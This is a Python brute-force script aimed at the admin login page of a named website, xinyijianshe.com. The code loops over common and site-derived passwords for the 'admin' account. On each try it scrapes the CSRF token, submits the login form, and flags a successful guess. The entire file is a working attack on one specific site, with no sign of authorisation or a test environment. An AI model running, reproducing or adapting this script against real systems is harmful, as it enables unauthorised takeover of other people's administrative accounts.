#!/usr/bin/env python3
"""xinyijianshe iWeb login brute"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
HOST = "http://xinyijianshe.com"

def get_op():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(op, url, data=None, timeout=8):
    try:
        h = {**UA}
        if data: h["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(3000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

for pw in ["admin", "admin123", "123456", "admin888", "xinyi123", "a123456", "12345678",
           "xinyijianshe", "xinyi", "123456789", "admin666"]:
    op = get_op()
    code, final, body = fetch(op, HOST + "/admin/login.html")
    m = re.search(r'__RequestVerificationToken[^>]*value="([^"]+)"', body)
    if not m:
        print("no token at", pw)
        break
    data = urllib.parse.urlencode({"UserName": "admin", "Password": pw, "submit": "login",
                                   "__RequestVerificationToken": m.group(1)})
    code, final, body = fetch(op, HOST + "/admin/login.html?ReturnUrl=%2fadmin%2f", data)
    ok = code == 302 or "退出" in body or "logout" in body.lower()
    print("admin/%s: code=%s ok=%s size=%d" % (pw, code, ok, len(body)))
    if ok:
        print("!!! HIT admin/%s" % pw)
        break
